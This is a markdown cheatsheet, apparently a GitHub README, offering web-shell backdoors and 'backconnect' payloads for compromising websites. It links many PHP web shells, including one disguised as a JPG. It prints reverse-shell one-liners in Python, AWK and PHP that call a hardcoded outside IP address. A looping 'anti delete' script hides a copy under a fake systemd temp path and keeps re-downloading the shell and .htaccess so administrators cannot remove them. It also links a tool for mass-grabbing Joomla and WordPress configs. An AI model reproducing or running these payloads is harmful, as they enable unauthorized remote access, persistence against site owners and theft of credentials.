# Cheatsheet Pentesting & Payloads By [@CallMeRep](https://t.me//CallMeRep)

## Summary
* [BackConnect Bypass](#trick-backconnect-bypass)
* [Tools](#tools)
* [ Example List Vulnerability ]
   * [AWS TAKEOVER S3](https://github.com/t101804/repshare/blob/main/aws_vuln_with_region.txt)
* [ Default Index CMS ]
   * [Index Joomla](https://github.com/t101804/repshare/blob/main/index_joomla.php)
* [ Shell Backdoor Bypass/Non ]
    * [Alfa Shells](https://github.com/t101804/repshare/blob/main/alfa.php)
    * [Evil Twin Shells](https://github.com/t101804/repshare/blob/main/eviltwin.php)
    * [Gecko Shells](https://github.com/t101804/repshare/blob/main/gk.php)
    * [Gecko JPG Shells](https://github.com/t101804/repshare/blob/main/gkjpg.jpg)
    * [Open Source Shells](https://github.com/t101804/repshare/blob/main/ac.php)
    * [Commander RCE Shell Bypass](https://github.com/t101804/repshare/blob/main/commander.php) 
    ```
    commander.php?command=[executeurcommand] then the response you can access in /output_command.txt
    ```
    * [SSI Shell](https://github.com/t101804/repshare/blob/main/ssial.shtml) 
    * [indoXploit Shell](https://github.com/t101804/repshare/blob/main/idx.php) 
    * [marijuana shell](https://github.com/t101804/repshare/blob/main/m4rijuana.php) 
    * [r57 shells](https://github.com/t101804/repshare/blob/main/r.php)
## Trick BackConnect Bypass
## Python 
```
export RHOST="104.248.145.105";export RPORT=1234;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```
## AWK 
```
awk 'BEGIN {s = "/inet/tcp/0/104.248.145.105/1234"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
## PHP EXEC & PHP SHELL EXEC
[EXEC] 
```
php -r '$sock=fsockopen("104.248.145.105",1234);exec("sh <&3 >&3 2>&3");'
```
[SHELL_EXEC] 
```
php -r '$sock=fsockopen("104.248.145.105",1234);shell_exec("sh <&3 >&3 2>&3");'
```

# Trick Defend Shells
### Anti Delete Command without Root Privilages : 
```
curl https://raw.githubusercontent.com/t101804/repshare/main/.htaccess -o /var/tmp/systemd-private-d2965998338a4e6a84320173dff28bb0-haveged.service-HgExaf2a; while true; do echo $(TZ=Asia/Jakarta date); if [ ! -f ac.php ] || ([ -f ac.php ] && ! grep -q '@CallMeRep' ac.php); then curl -o ac.php https://raw.githubusercontent.com/t101804/repshare/main/ac.php; fi; if [ -r .htaccess ] && [ -w .htaccess ] && ! cmp --silent .htaccess /var/tmp/systemd-private-d2965998338a4e6a84320173dff28bb0-haveged.service-HgExaf2a; then curl https://raw.githubusercontent.com/t101804/repshare/main/.htaccess -o .htaccess; fi; echo $(TZ=Asia/Jakarta date); sleep 2; done
```
#### Script for that if you want see detail script
```
wget https://raw.githubusercontent.com/t101804/repshare/main/priv8_anti_delet.sh
```
## Tools
- [reverse-shell-generator](https://www.revshells.com/)
- [mass-grab-config-joomla&wp-vhost-symlink](https://github.com/t101804/repshare/blob/main/mass_vghost_config_grab.py)
- [linux_privilage_check_that_i_use](https://github.com/sleventyeleven/linuxprivchecker)

Credit by revshells.com and @CallMeRep
